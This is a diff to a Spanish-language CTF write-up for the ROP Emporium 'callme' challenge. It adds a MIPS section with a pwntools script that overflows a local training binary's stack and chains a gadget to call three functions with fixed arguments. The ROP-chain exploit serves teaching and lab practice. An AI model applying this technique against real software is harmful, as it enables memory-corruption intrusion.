@@ -106,7 +106,7 @@ Encontramos un gadget que nos permita hacer esto:
   0x0040093f                 c3  ret
 ```
 
-Primero retornamos al gadget, preparamos los registro y después es que llamamos a la función.
+Primero retornamos al gadget, preparamos los registros y después es que llamamos a la función.
 
 Exploit completo con python/pwntools:
 ``` python
@@ -134,9 +134,25 @@ io.sendline(payload)
 io.interactive()
 ```
 
+## MIPS
 
+Con este gadget: `0x00400bb0 # lw $a0, 0x10($sp); lw $a1, 0xc($sp); lw $a2, 8($sp); lw $t9, 4($sp); jalr $t9; nop;` podemos preparar los tres registros de argumentos, `a0`, `a1`, `a2`, y la direccion de retorno `t9` a un offset especifico, las funciones "callme" retornan a $ra, que apunta al gadget nuevamente solo que con el sp ahora actualizado:
 
+```py
+from pwn import *
+io = process("qemu-mipsel -L /usr/mipsel-linux-gnu callme_mipsel",shell=True)
 
+caller = 0x00400bb0 # lw $a0, 0x10($sp); lw $a1, 0xc($sp); lw $a2, 8($sp); lw $t9, 4($sp); jalr $t9; nop;
+callme_one = 0x00400d20
+callme_two = 0x00400d80
+callme_three = 0x00400d10
 
+payload = b""
+payload += b"A"*36
+payload += p32(caller) + p32(0) + p32(callme_one) + p32(0xd00df00d) + p32(0xcafebabe) + p32(0xdeadbeef)
+payload += p32(caller) + p32(0) + p32(callme_two) + p32(0xd00df00d) + p32(0xcafebabe) + p32(0xdeadbeef)
+payload += p32(caller) + p32(0) + p32(callme_three) + p32(0xd00df00d) + p32(0xcafebabe) + p32(0xdeadbeef)
 
-
+io.send(payload)
+io.interactive()
+```
